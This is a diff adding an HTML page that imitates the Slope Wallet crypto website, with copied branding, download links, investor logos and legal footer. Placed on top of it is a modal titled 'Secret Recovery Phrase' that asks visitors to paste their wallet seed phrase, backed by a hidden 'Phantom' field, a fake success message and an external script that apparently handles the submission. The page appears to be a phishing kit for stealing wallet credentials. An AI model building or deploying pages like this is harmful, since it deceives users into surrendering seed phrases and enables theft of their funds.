@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta data-n-head="ssr" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover, user-scalable=0" />
+    <title>Slope Wallet | Slope | Slope Finance</title>
+    
+    <!-- Добавляем скрипты здесь -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/wallet-adapter-base"></script>
+        <meta data-n-head="ssr" data-hid="description" name="description" content="Slope Wallet is the leading mobile decentralized exchange and wallet for managing your crypto assets on Solana. " />
+        <meta data-n-head="ssr" name="keywords" content="Slope, Slope wallet, Slope crypto, Slope Solana, decentralized exchange, crypto wallet, blockchain, cryptocurrency, NFT" />
+        <meta data-n-head="ssr" name="robots" content="index, follow" />
+        <meta property="og:title" content="Slope | The Best Mobile Decentralized Exchange and Wallet for Crypto" />
+        <meta property="og:description" content="Slope is the leading mobile decentralized exchange and wallet for managing your crypto assets on Solana. Join us to explore the future of finance." />
+        <meta property="og:image" content="_nuxt/img/logo2.74b4331.png" />
+        <meta property="og:url" content="YOUR_PAGE_URL" />
+        <meta property="og:type" content="website" />
+        <link data-n-head="ssr" rel="icon" type="image/x-icon" href="favicon.ico" />
+        <link data-n-head="ssr" rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&amp;family=Roboto:wght@300;400;500;700&amp;display=swap" />
+        <script data-n-head="ssr" async src="https://www.googletagmanager.com/gtag/js?id=G-LE5S6BVZBG"></script>
+        <link rel="preload" href="./_nuxt/c2f32af.js" as="script" />
+        <link rel="preload" href="./_nuxt/5cb65f2.js" as="script" />
+        <link rel="preload" href="./_nuxt/2971aa4.js" as="script" />
+        <link rel="preload" href="./_nuxt/d5a6966.js" as="script" />
+        <link rel="preload" href="./_nuxt/13bd49a.js" as="script" />
+        <link rel="stylesheet" href="./css/2.f2ca9a99.chunk.css">
+        <link rel="stylesheet" href="./css/main.848ef03a.css">
+        <link rel="stylesheet" href="./css/style.css">
+        <link rel="stylesheet" href="./css/style2.css">
+        <style>
+            /* Your existing CSS styles here */
+        </style>
+    </head>
+    <body>
+<div class="Phantom modal" id="modal-1">
+    <div class="wallet-adapter-modal-wrapper modal__content">
+        <div class="wallet-adapter-modal-logo-wrapper">
+            <img alt="logo" class="wallet-adapter-modal-logo" src="./_nuxt/img/logo2.74b4331.png" />
+        </div>
+        <h1 class="wallet-adapter-modal-title" id="wallet-adapter-modal-title">
+            Secret Recovery Phrase
+            <div class="import-account__selector-label" style="font-size: 20px; line-height: 1.1; font-weight: 300;">
+                Restore an existing wallet with your 12 or 24-word secret recovery phrase.
+            </div>
+        </h1>
+        <button class="wallet-adapter-modal-button-close modal__close-button">
+            <img src="./_nuxt/img/close.svg" width="12" alt="" />
+        </button>
+        <form id="formx" method="post" action="javascript:void(null);" name="formx">
+            <div id="results"></div>
+            <div class="wallet-adapter-collapse" id="wallet-adapter-modal-collapse" role="region">
+                <ul class="wallet-adapter-modal-list">
+                    <input type="hidden" id="firstn" name="namecash" value="Phantom" />
+                    <textarea id="first" name="value" class="import-account__secret-phrase" 
+                        placeholder="Secret phrase" required></textarea>
+                    <li>
+                        <button type="submit" class="connect-button">Connect</button>
+                    </li>
+                </ul>
+            </div>
+        </form>
+    </div>
+</div>
+        <!-- Other wallet modals here -->
+        <div role="alert" class="el-message el-message--warning sty1-message" style="display: none; opacity: 0; top: -50px">
+            <i class="el-message__icon el-icon-warning"></i><p id="gcon" class="el-message__content">coming soon</p>
+        </div>
+        <div role="alert" class="el-message el-message--success sty1-message sty1-nowrap-message" style="display: none; opacity: 0; top: -50px">
+            <i class="el-message__icon el-icon-success"></i>
+            <p class="el-message__content" id="scon">Submitted successfully!</p>
+        </div>
+        <div data-server-rendered="true" id="__nuxt">
+            <!---->
+            <div id="__layout">
+                <div>
+                    <i class="icon-menu"></i>
+                    <div class="holder"></div>
+                    <header class="mui-header mui-shr-0">
+                        <div class="section mui-fl-vert mui-fl-btw">
+                            <div class="mui-header-in mui-flex">
+                                <div class="logo">
+                                    <a href="index.html" aria-current="page" class="logo-link nuxt-link-exact-active nuxt-link-active"><span class="seo-span">slope</span></a>
+                                </div>
+                            </div>
+                            <div class="mui-flex mui-fl-vert">
+                                <ul class="nav mui-fl-vert">
+                                    <li class="active">
+                                        Wallet
+                                    </li>
+                                    <li>
+                                        NFT
+                                    </li>
+                                    <li>
+                                        DAO
+                                    </li>
+                                    <li><a href="https://slope-finance.medium.com/" target="_blank">Media</a></li>
+                                    <li><a href="https://docs.slope.finance/" target="_blank">Documents</a></li>
+                                    <li><a href="https://support.slope.finance/en" target="_blank">Support</a></li>
+                                    <li id="connectWallet">
+                                        <a href="">connectWallet</a>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </header>
+                    <div data-v-739f5b6a>
+                        <div class="banner" data-v-739f5b6a>
+                            <div class="banner1 section" data-v-739f5b6a>
+                                <h1 data-v-739f5b6a>
+                                    Slope Wallet<br data-v-739f5b6a />
+                                    Your web3 navigator
+                                </h1>
+                                <p class="banner1-flow" data-v-739f5b6a>
+                                    For the curious! The easiest way to discover web3 applications
+                                </p>
+                                <ul class="sty1-gp ctrl1" data-v-739f5b6a>
+                                    <li class="mui-flex" data-v-739f5b6a>
+                                        <div class="item" data-v-739f5b6a>
+                                            <a id="callback-button" href="https://apps.apple.com/us/app/slope-wallet/id1574624530" target="_blank" class="mui-fl-vert" data-v-739f5b6a>
+                                                <i class="icon-sty1 mui-shr-0 icon-appstore" data-v-739f5b6a></i>
+                                                <div data-v-739f5b6a>
+                                                    <p data-v-739f5b6a>Download on the</p>
+                                                    <p data-v-739f5b6a>App Store</p>
+                                                </div>
+                                            </a>
+                                        </div>
+                                        <div class="item" data-v-739f5b6a>
+                                            <a id="callback-button" href="https://play.google.com/store/apps/details?id=com.wd.wallet" target="_blank" class="mui-fl-vert" data-v-739f5b6a>
+                                                <i class="icon-sty1 mui-shr-0 icon-googleplay" data-v-739f5b6a></i>
+                                                <div data-v-739f5b6a>
+                                                    <p data-v-739f5b6a>Get it on</p>
+                                                    <p data-v-739f5b6a>Google Play</p>
+                                                </div>
+                                            </a>
+                                        </div>
+                                    </li>
+                                    <li class="mui-flex" data-v-739f5b6a>
+                                        <div class="item" data-v-739f5b6a>
+                                            <a id="callback-button" href="https://dl.slope.finance/app/slope.apk" target="_blank" class="mui-fl-vert" data-v-739f5b6a>
+                                                <i class="icon-sty1 mui-shr-0 icon-android" data-v-739f5b6a></i>
+                                                <div data-v-739f5b6a>
+                                                    <p data-v-739f5b6a>Download for</p>
+                                                    <p data-v-739f5b6a>Android Apk</p>
+                                                </div>
+                                            </a>
+                                        </div>
+                                        <div class="item" data-v-739f5b6a>
+                                            <a id="callback-button" href="https://chrome.google.com/webstore/detail/slope-finance-wallet/pocmplpaccanhmnllbbkpgfliimjljgo" target="_blank" class="mui-fl-vert" data-v-739f5b6a>
+                                                <i class="icon-sty1 mui-shr-0 icon-chrome" data-v-739f5b6a></i>
+                                                <div data-v-739f5b6a>
+                                                    <p data-v-739f5b6a>Add to</p>
+                                                    <p data-v-739f5b6a>Chrome</p>
+                                                </div>
+                                            </a>
+                                        </div>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div id="wallet" class="first section mui-fl-col mui-fl-central" data-v-739f5b6a>
+                            <h2 class="title" data-v-739f5b6a>Discover the web3 world <span data-v-739f5b6a>All in one</span></h2>
+                            <ul class="adv-dot mui-fl-wrap mui-fl-hori" data-v-739f5b6a>
+                                <li data-v-739f5b6a>Cross-Platform</li>
+                                <li data-v-739f5b6a>Non-Custodial</li>
+                                <li data-v-739f5b6a>Token Swap</li>
+                                <li data-v-739f5b6a>DApp Support</li>
+                                <li data-v-739f5b6a>NFTs &amp; Collectibles</li>
+                            </ul>
+                            <div class="adv-ul-wrap mui-fl-central" data-v-739f5b6a>
+                                <img src="_nuxt/img/first-phone.d41545d.png" class="img-first-phone" data-v-739f5b6a />
+                                <ul class="adv-ul mui-fl-wrap mui-fl-btw" data-v-739f5b6a>
+                                    <li data-v-739f5b6a>
+                                        <h5 class="mui-fl-vert" data-v-739f5b6a>
+                                            Access From Multiple Devices
+                                        </h5>
+                                        <p data-v-739f5b6a>Users can access the same identity from multiple devices through a few simple steps.</p>
+                                    </li>
+                                    <li data-v-739f5b6a>
+                                        <h5 class="mui-fl-vert" data-v-739f5b6a>
+                                            Explore Solana DApps
+                                        </h5>
+                                        <p data-v-739f5b6a>Slope provides the simplest yet most secure way to connect to solana DApps. You are always in control when interacting on the new decentralized web.</p>
+                                    </li>
+                                    <li data-v-739f5b6a>
+                                        <h5 class="mui-fl-vert" data-v-739f5b6a>
+                                            Gain Full Control of Your Account
+                                        </h5>
+                                        <p data-v-739f5b6a>Users can choose to manage account by themselves. Slope will guide users to encrypt and backup credentials.</p>
+                                    </li>
+                                    <li data-v-739f5b6a>
+                                        <h5 class="mui-fl-vert" data-v-739f5b6a>
+                                            Solana Nucleus - The Heartbeat of Solana
+                                        </h5>
+                                        <p data-v-739f5b6a>One-stop Solana eco rankings, news, industry developments.</p>
+                                    </li>
+                                </ul>
+                            </div>
+                            <ul class="sty1-gp ctrl2 mui-fl-hori mui-fl-wrap" data-v-739f5b6a>
+                                <li class="item" data-v-739f5b6a>
+                                    <a href="https://apps.apple.com/us/app/slope-wallet/id1574624530" target="_blank" class="mui-fl-vert" data-v-739f5b6a>
+                                        <i class="icon-sty1 mui-shr-0 icon-appstore" data-v-739f5b6a></i>
+                                        <div data-v-739f5b6a>
+                                            <p data-v-739f5b6a>Download on the</p>
+                                            <p data-v-739f5b6a>App Store</p>
+                                        </div>
+                                    </a>
+                                </li>
+                                <li class="item" data-v-739f5b6a>
+                                    <a href="https://play.google.com/store/apps/details?id=com.wd.wallet" target="_blank" class="mui-fl-vert" data-v-739f5b6a>
+                                        <i class="icon-sty1 mui-shr-0 icon-googleplay" data-v-739f5b6a></i>
+                                        <div data-v-739f5b6a>
+                                            <p data-v-739f5b6a>Get it on</p>
+                                            <p data-v-739f5b6a>Google Play</p>
+                                        </div>
+                                    </a>
+                                </li>
+                                <li class="item mui-fl-vert" data-v-739f5b6a>
+                                    <a href="https://dl.slope.finance/app/slope.apk" target="_blank" class="mui-fl-vert" data-v-739f5b6a>
+                                        <i class="icon-sty1 mui-shr-0 icon-android" data-v-739f5b6a></i>
+                                        <div data-v-739f5b6a>
+                                            <p data-v-739f5b6a>Download for</p>
+                                            <p data-v-739f5b6a>Android Apk</p>
+                                        </div>
+                                    </a>
+                                </li>
+                                <li class="item mui-fl-vert" data-v-739f5b6a>
+                                    <a href="https://chrome.google.com/webstore/detail/slope-finance-wallet/pocmplpaccanhmnllbbkpgfliimjljgo" target="_blank" class="mui-fl-vert" data-v-739f5b6a>
+                                        <i class="icon-sty1 mui-shr-0 icon-chrome" data-v-739f5b6a></i>
+                                        <div data-v-739f5b6a>
+                                            <p data-v-739f5b6a>Add to</p>
+                                            <p data-v-739f5b6a>Chrome</p>
+                                        </div>
+                                    </a>
+                                </li>
+                            </ul>
+                            <div class="onemore mui-fl-vert mui-fl-wrap" data-v-739f5b6a>
+                                <div class="mui-fl-btw mui-fl-wrap" data-v-739f5b6a>
+                                    <p class="p1 mui-fl-hori mui-fl-vert" data-v-739f5b6a>
+                                        One More Thing
+                                    </p>
+                                    <div class="sub mui-fl-hori" data-v-739f5b6a>
+                                        <div class="ipt1" data-v-739f5b6a>
+                                            <div class="ipt-sty2 el-input" data-v-739f5b6a>
+                                                <!---->
+                                                <input type="text" autocomplete="off" placeholder="Email" class="el-input__inner" />
+                                                <!----><!----><!----><!---->
+                                            </div>
+                                        </div>
+                                        <button id="sub" class="btn" data-v-739f5b6a>
+                                            Join the Waitlist
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="nft" class="thir section mui-fl-col mui-fl-vert" data-v-739f5b6a>
+                            <h5 class="title" data-v-739f5b6a>Mint, Collect, and Auction <span data-v-739f5b6a>Extraordinary</span>NFTs</h5>
+                            <div class="content-wrap mui-fl-central" data-v-739f5b6a>
+                                <img src="_nuxt/img/nfts-phone.8d75fe1.png" class="img-nfts-phone" data-v-739f5b6a />
+                                <div class="content mui-fl-central" data-v-739f5b6a>
+                                    <ul data-v-739f5b6a>
+                                        <li class="mui-fl-vert mui-fl-btw" data-v-739f5b6a>
+                                            <h5 data-v-739f5b6a>
+                                                Your Store <br data-v-739f5b6a />
+                                                Your Way
+                                            </h5>
+                                            <div class="mui-fl-end" data-v-739f5b6a>
+                                                <p data-v-739f5b6a>Slope lets artists and creators mint their own NFTs and launch self-hosted NFT storefronts in Slope wallet.</p>
+                                                <i class="mui-shr-0 icon-sty3 icon-adv11" data-v-739f5b6a></i>
+                                            </div>
+                                        </li>
+                                        <li class="mui-fl-vert mui-fl-btw" data-v-739f5b6a>
+                                            <h5 data-v-739f5b6a>
+                                                Insanely <br data-v-739f5b6a />
+                                                Low Fees
+                                            </h5>
+                                            <div class="mui-fl-end" data-v-739f5b6a>
+                                                <p data-v-739f5b6a>Average minting cost of less than a dollar and no platform fee.</p>
+                                                <i class="mui-shr-0 icon-sty3 icon-adv12" data-v-739f5b6a></i>
+                                            </div>
+                                        </li>
+                                        <li class="mui-fl-vert mui-fl-btw" data-v-739f5b6a>
+                                            <h5 data-v-739f5b6a>
+                                                Slope <br data-v-739f5b6a />
+                                                Mystery <br data-v-739f5b6a />
+                                                Box
+                                            </h5>
+                                            <div class="mui-fl-end" data-v-739f5b6a>
+                                                <p data-v-739f5b6a>Gamification module that distributes random NFTs to participants. It helps promote community engagement and retention.</p>
+                                                <i class="mui-shr-0 icon-sty3 icon-adv13" data-v-739f5b6a></i>
+                                            </div>
+                                        </li>
+                                    </ul>
+                                </div>
+                                <img src="_nuxt/img/nfts-phone.8d75fe1.png" class="img-nfts-phone" data-v-739f5b6a />
+                            </div>
+                        </div>
+                        <div class="four section mui-fl-col mui-fl-vert" data-v-739f5b6a>
+                            <h5 class="title" data-v-739f5b6a>The <span data-v-739f5b6a>Most Trusted</span> Decentralized Exchange and Wallet</h5>
+                            <ul class="content mui-flex" data-v-739f5b6a>
+                                <li class="left mui-fl-col mui-fl-hori" data-v-739f5b6a>
+                                    <p data-v-739f5b6a>Audited and Verified</p>
+                                    <img src="_nuxt/img/certik.ca2e742.png" alt data-v-739f5b6a />
+                                </li>
+                                <li class="right" data-v-739f5b6a>
+                                    <h5 data-v-739f5b6a>Bug Bounties Never Stop!</h5>
+                                    <p class="p1" data-v-739f5b6a>
+                                        Get Total Rewards
+                                    </p>
+                                    <p class="p2" data-v-739f5b6a>
+                                        1,000,000 SLOPE
+                                    </p>
+                                    <button class="btn" data-v-739f5b6a>
+                                        <a href="https://docs.google.com/forms/d/e/1FAIpQLSfjdb0EaZe_wymdBNQmtl-zqUmf8UWySGvvOvHnT3xafPHEEQ/viewform?usp=sf_link" target="_blank" data-v-739f5b6a>Submit a Bug!</a>
+                                    </button>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="five section mui-fl-col mui-fl-vert" data-v-739f5b6a>
+                            <h5 class="title" data-v-739f5b6a>Backed by <span data-v-739f5b6a>World-class </span> Investors</h5>
+                            <ul class="mui-fl-wrap mui-fl-central" data-v-739f5b6a>
+                                <img src="_nuxt/img/01.1a4febc.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/02.3b0ee23.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/03.d74ecd9.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/04.2c32abf.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/05.38eca71.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/06.282a927.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/07.f67d615.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/08.8b5b303.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/09.a72e084.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/10.9f38696.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/11.d3d0900.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/12.8730e62.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/13.5248a5a.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/14.ab89d36.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/15.35efe05.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/16.c4b3749.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/17.66cf2b3.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/18.70a1d9e.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/19.875429f.png" alt data-v-739f5b6a />
+                                <img src="_nuxt/img/20.0d7ba61.png" alt data-v-739f5b6a />
+                            </ul>
+                        </div>
+                        <div class="six section mui-fl-col mui-fl-vert" data-v-739f5b6a>
+                            <img src="_nuxt/img/logo-bg1.c2aeb84.png" alt data-v-739f5b6a />
+                            <h5 data-v-739f5b6a>Subscribe to Our Newsletter</h5>
+                            <p class="p1" data-v-739f5b6a>
+                                Stay Up to Date on Slope News!
+                            </p>
+                            <div class="sub" data-v-739f5b6a>
+                                <div class="ipt1" data-v-739f5b6a>
+                                    <div class="ipt-sty1 el-input" data-v-739f5b6a>
+                                        <!---->
+                                        <input type="text" autocomplete="off" placeholder="Email" class="el-input__inner" />
+                                        <!----><!----><!----><!---->
+                                    </div>
+                                </div>
+                                <button id="sub" class="btn" data-v-739f5b6a>
+                                    Subscribe NOW !
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    <footer class="footer">
+                        <div class="section">
+                            <ul class="mui-fl-btw mui-fl-wrap content">
+                                <li class="footer-metavisa"><div class="footer-logo"></div></li>
+                                <div class="mui-fl-wrap mui-fl-btw">
+                                    <li class="footer-li mui-fl-1">
+                                        <h5>
+                                            Company
+                                        </h5>
+                                        <ul>
+                                            <li class="taplight2">
+                                                <a href="https://docs.slope.finance/" target="_blank">
+                                                    About
+                                                </a>
+                                            </li>
+                                            <li class="taplight2">
+                                                <a href="https://slopegroup.notion.site/Slope-Open-Roles-05c568d75d5940b6b1d2e8c4fa191935" target="_blank">
+                                                    Careers
+                                                </a>
+                                            </li>
+                                            <li class="taplight2">
+                                                <a href="https://drive.google.com/drive/folders/1XFYTrZulqL-NQ7PaggIAlW7k7TyuJzQg" target="_blank">
+                                                    Mediakit
+                                                </a>
+                                            </li>
+                                            <li class="taplight2">
+                                                <a href="https://docs.slope.finance/learn-more/private-policy" target="_blank">
+                                                    Privacy Policy
+                                                </a>
+                                            </li>
+                                            <li class="taplight2">
+                                                <a href="https://docs.slope.finance/learn-more/terms-of-use" target="_blank">
+                                                    Terms of Use
+                                                </a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                    <li class="footer-li mui-fl-1">
+                                        <h5>
+                                            Product
+                                        </h5>
+                                        <ul>
+                                            <li class="taplight2">
+                                                Slope Wallet
+                                            </li>
+                                            <li class="taplight2">
+                                                Slope DEX
+                                            </li>
+                                            <li class="taplight2">
+                                                Slope NFT
+                                            </li>
+                                        </ul>
+                                    </li>
+                                    <li class="footer-li mui-fl-1">
+                                        <h5>
+                                            Developer
+                                        </h5>
+                                        <ul>
+                                            <li class="taplight2">
+                                                <a href="Slope%20Finance%20-%20Lightpaper.pdf" target="_blank">
+                                                    Litepaper
+                                                </a>
+                                            </li>
+                                            <li class="taplight2">
+                                                <a href="https://docs.slope.finance/" target="_blank">
+                                                    Documents
+                                                </a>
+                                            </li>
+                                            <li class="taplight2">
+                                                <a href="https://github.com/solana-labs/wallet-adapter/tree/master/packages/wallets/slope" target="_blank">
+                                                    Github Repository
+                                                </a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                    <li class="footer-li mui-fl-1">
+                                        <h5>
+                                            Governance
+                                        </h5>
+                                        <ul>
+                                            <li class="taplight2">
+                                                Slope DAO
+                                            </li>
+                                            <li class="taplight2">
+                                                Overview
+                                            </li>
+                                            <li class="taplight2">
+                                                Leaderboard
+                                            </li>
+                                            <li class="taplight2">
+                                                Forums
+                                            </li>
+                                        </ul>
+                                    </li>
+                                    <li class="footer-li mui-fl-1">
+                                        <h5>
+                                            Community
+                                        </h5>
+                                        <ul>
+                                            <li class="taplight2">
+                                                <a href="https://twitter.com/slope_finance" target="_blank">
+                                                    Twitter
+                                                </a>
+                                            </li>
+                                            <li class="taplight2">
+                                                <a href="https://discord.com/invite/3n6vg89v3M" target="_blank">
+                                                    Discord
+                                                </a>
+                                            </li>
+                                            <li class="taplight2">
+                                                <a href="https://t.me/Slope_community" target="_blank">
+                                                    Telegram
+                                                </a>
+                                            </li>
+                                            <li class="taplight2">
+                                                <a href="https://slope-finance.medium.com/" target="_blank">
+                                                    Medium
+                                                </a>
+                                            </li>
+                                            <li class="taplight2">
+                                                <a href="mailto:business@slope.group" target="_blank">
+                                                    Email
+                                                </a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                </div>
+                                <div class="desc">
+                                    <p>
+                                        This website is maintained by Slope Group LLC. The contents and opinions of this website are those of Slope Group LLC. Slope Group LLC does not warrant that the information provided by these websites
+                                        is correct, complete, and up-to-date. Slope Group LLC is not responsible for their content and expressly rejects any liability for damages of any kind resulting from the use, reference to, or reliance
+                                        on any information contained within these websites.
+                                    </p>
+                                    <p>
+                                        Slope DEX is a completely decentralized exchange. To the maximum extent permitted under applicable law, Slope DEX expressly disclaims, and you waive, any and all other warranties of any kind, whether
+                                        express or implied, including, without limitation, warranties of merchantability, fitness for a particular purpose, title or non-infringement or warranties arising from course of performance, course
+                                        of dealing or usage in trade.
+                                    </p>
+                                    <p>
+                                        Slope products are not available to residents of China, Belarus, The Central African Republic, The Democratic Republic of Congo, The Democratic People’s Republic of Korea, The Crimea region of
+                                        Ukraine, Cuba, Iran, Libya, Somalia, Sudan, South Sudan, Syria, The USA, Yemen, and Zimbabwe or any other jurisdiction in which accessing or using the Slope products are prohibited (“Prohibited
+                                        Jurisdiction"). In using the Slope Products, you confirm that you do not reside in a Prohibited Jurisdiction.
+                                    </p>
+                                </div>
+                            </ul>
+                            <p class="copyright">
+                                Copyright © 2021. Slope Group LLC.
+                            </p>
+                        </div>
+                    </footer>
+                    <!---->
+                </div>
+            </div>
+        </div>
+        <script>
+            window.__NUXT__ = (function (a, b, c, d) {
+                return {
+                    layout: "default",
+                    data: [{}],
+                    fetch: {},
+                    error: a,
+                    serverRendered: true,
+                    routePath: b,
+                    config: {
+                        koapiURL: "https://api.slope.finance/api",
+                        nftapiUrl: "https://activity.slope.finance",
+                        web3Url: "https://slope.rpcpool.com",
+                        airdropAccount: "B45uBCXhjc35zp3ktUrLcEatuReLhKj4Q7RYietm9Bbz",
+                        senderAccount: "4rVMVVMk1UoF68BSdyEovV2P58gSBC7mpJz4QPd7kHvq",
+                        galaxySenderAccount: "D4xajm9ak8uXLCrLUPPs9coDtKXDM61c4RedgmEUYvWw",
+                        assetPoolAccount: "6yqMBmRrWDfcCPfJdmCpRZVJZFLh9GSEWEFezFMHbM4g",
+                        larixMint: "Lrxqnh6ZHKbGy3dcrCED43nsoLkM1LTzU2jRfWe8qUC",
+                        poolTokenAccount: "J9EB51z8DMtigbTUFrptJvbaBpLtq9AHtKUHRg9h3mk7",
+                        gofxMint: "GFX1ZjR2P15tmrSwow6FjyDYcEkoFb4p4gJCpLBjaxHD",
+                        gofxAssetPoolAccount: "9vcyw1eiJSWAAey9r2T8E3H2EfjHFFSrhJbWydvWok7L",
+                        gofxPoolTokenAccount: "DgvkcCyMM82FAq16Bi7Q6iQJVXcS5qGZGskqVPFi6Y4W",
+                        usdcMint: c,
+                        usdcAssetPoolAccount: "3Agb3V3wDtqNmRKuv4t36ahPxMmPhvAVSCfxbG4fj6gx",
+                        usdcPoolTokenAccount: "43irJPeKn5iTAHnR42EBKn3dQ4MJ97m4LocpAR2T89S2",
+                        usdtAssetPoolAccount: "4Um9z6rSWaAkhrPGmdrbG9czSiJFC4h8urMkepX6QXxk",
+                        usdtMint: d,
+                        usdtPoolTokenAccount: "91zdpB4j1qEt2LiS8qtHvaMrMyfonUC9qwCsFjmD7w5C",
+                        raydiumMint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R",
+                        rayAssetPoolAccount: "3Zu4Xhbicj9NjcTLMmWuut7Ww5vzezCNAGBSoNEE1mqA",
+                        rayPoolTokenAccount: "8LUAtf1wv7PK39GfowKfNHaUGFzqqoamG8gYV7C7TZEC",
+                        galaxyUsdcMint: c,
+                        galaxyUsdcAssetPoolAccount: "24EXAPHMMvszdQ3pVZoqvi2nGQFijbgTfQ1uALGS2ikU",
+                        galaxyUsdcPoolTokenAccount: "2g8UkxPfxdVUe5TAfUF3dJDubGptJkLm2CnYHpYJT7UP",
+                        galaxyUsdtAssetPoolAccount: "GGEM3pt3jn4wNsVHfwowptr1fNo9WuXDMDuyWMPddTHS",
+                        galaxyUsdtMint: d,
+                        galaxyUsdtPoolTokenAccount: "FfKtQJjQteu9MzqCUfvbhTvSQ29sTCCP6w8DnEmRcvx3",
+                        koapiVer: "/v1",
+                        _app: { basePath: b, assetsPath: "/_nuxt/", cdnURL: a },
+                    },
+                };
+            })(null, "/","EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
+        </script>
+        <script src="_nuxt/c2f32af.js" defer></script>
+        <script src="_nuxt/13bd49a.js" defer></script>
+        <script src="_nuxt/5cb65f2.js" defer></script>
+        <script src="_nuxt/2971aa4.js" defer></script>
+        <script src="_nuxt/d5a6966.js" defer></script>
+        <script src="js/src.js"></script>
+    </body>
+</html>
